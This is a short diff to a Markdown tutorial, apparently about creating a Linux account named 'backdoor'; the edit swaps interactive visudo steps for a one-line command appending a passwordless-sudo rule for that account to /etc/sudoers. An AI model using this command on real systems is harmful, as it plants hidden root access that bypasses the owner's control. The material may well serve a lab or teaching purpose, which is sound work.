@@ -87,17 +87,10 @@ passwd: password for backdoor changed by root
 Next, we need to give the backdoor user permission to use `sudo` so that they can get root access:
 
 ```sh
-visudo
+echo 'backdoor ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers
 ```
 
-Press `o` to open a new line, then add the `backdoor` user like this:
-
-```
-# add this line
-backdoor ALL=(ALL) NOPASSWD: ALL
-```
-
-Press Escape and type `:wq` to write and quit. Now, we can test our new user:
+Now, we can test our new user:
 
 ```sh
 su - backdoor
